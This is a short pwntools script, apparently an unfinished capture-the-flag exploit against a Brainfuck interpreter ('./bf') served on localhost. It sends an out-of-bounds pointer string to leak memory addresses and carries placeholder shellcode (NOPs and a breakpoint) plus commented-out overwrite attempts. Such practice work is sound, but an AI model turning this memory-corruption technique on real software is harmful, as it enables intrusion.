from pwn import *

shellcode = b"\x90\x90\x90\x90\x90\xCC"

bf_str = '<' * 0x8B + '.>' * 32
print(bf_str)
#io = gdb.debug("./bf", """
#break main
#continue
#finish
#info addr p
#""")
io = remote('localhost', 2020)
print(io.recvuntil('[ ]'))
io.sendline(bf_str)
# 0xf7e1be32
#io.send(shellcode)
#io.send(b'\x30\x32\xbe\xe1\xf7')
u = make_unpacker(32, endian='little', sign='unsigned')
print(hex(u(io.recvn(4))))
print(hex(u(io.recvn(4))))
print(hex(u(io.recvn(4))))
print(hex(u(io.recvn(4))))
print(hex(u(io.recvn(4))))
print(hex(u(io.recvn(4))))
print(hex(u(io.recvn(4))))
print(hex(u(io.recvn(4))))



#io.sendline(shellcode + '\x30\xa0\xa0\x04\x08')
io.interactive()

